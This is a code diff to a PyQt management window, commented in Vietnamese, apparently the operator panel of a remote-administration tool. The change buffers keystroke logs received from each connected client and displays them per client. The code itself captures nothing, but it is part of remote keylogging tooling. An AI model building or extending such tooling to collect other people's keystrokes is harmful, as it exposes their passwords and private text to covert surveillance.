@@ -130,6 +130,7 @@ class ManageClientsWindow(QWidget):
         # Biến tracking cho keylogger mode
         self.keylogger_active = False  # Có đang hiển thị keylogger hay không
         self.session_keylog_buffer = []  # Buffer keylog trong session hiện tại
+        self.keylog_buffers = {}  # Lưu keylog theo từng client
 
         # Khu vực thông tin chi tiết client
         self.info_frame = QFrame()
@@ -302,6 +303,10 @@ class ManageClientsWindow(QWidget):
         else:
             self.lbl_status.setStyleSheet("font-size: 11pt; font-weight: bold; color: gray;")
             self.lbl_status.setText("Status: no connected")
+
+        # Nếu đang mở tab keylogger, refresh nội dung cho client mới chọn
+        if self.keylogger_active:
+            self.view_keylogger()
 
     def open_add_client(self):
         from src.gui.add_client import AddClientWindow  
@@ -606,9 +611,10 @@ class ManageClientsWindow(QWidget):
                 </div>
             """
             self.action_area.setHtml(html_content)
-            
-            # Hiển thị buffer hiện tại (nếu có)
-            for log_entry in self.session_keylog_buffer:
+
+            # Hiển thị buffer hiện tại (ưu tiên buffer per-client nếu có)
+            client_buffer = self.keylog_buffers.get(self.selected_client_id, [])
+            for log_entry in (client_buffer or self.session_keylog_buffer):
                 self.action_area.append(log_entry)
         else:
             # Client chưa bắt đầu dịch vụ
@@ -699,10 +705,8 @@ class ManageClientsWindow(QWidget):
                     client_id = input_data.get('ClientID', 'Unknown')
                     logged_at = input_data.get('LoggedAt', timestamp)
                     
-                    # Chỉ hiển thị nếu là từ client đang được chọn
-                    if self.selected_client_id and client_id != self.selected_client_id:
-                        print(f"[display_keylog] Bỏ qua keylog từ {client_id}, đang chọn {self.selected_client_id}")
-                        return
+                    # Luôn buffer theo client, chỉ hiển thị ngay nếu đang chọn
+                    buffer = self.keylog_buffers.setdefault(client_id, [])
                     
                     # Format đơn giản như chat log - chỉ hiển thị timestamp và text
                     log_html = f"""
@@ -711,13 +715,17 @@ class ManageClientsWindow(QWidget):
                         <span style='color: {TEXT_LIGHT}; font-family: monospace; margin-left: 8px;'>{key_data}</span>
                     </div>
                     """
-                    
-                    # Thêm vào buffer
+
+                    # Thêm vào buffer per-client và buffer session cũ (giữ tương thích)
+                    buffer.append(log_html)
                     self.session_keylog_buffer.append(log_html)
                     
-                    # Hiển thị
-                    self.action_area.append(log_html)
-                    print(f"[display_keylog] ✅ Hiển thị keylog: {key_data[:20]}...")
+                    # Hiển thị nếu đúng client và đang bật keylogger
+                    if self.keylogger_active and self.selected_client_id == client_id:
+                        self.action_area.append(log_html)
+                        print(f"[display_keylog] ✅ Hiển thị keylog: {key_data[:20]}...")
+                    else:
+                        print(f"[display_keylog] ✅ Lưu keylog cho {client_id}, chưa hiển thị (selected={self.selected_client_id})")
             
             else:
                 # Không có input data
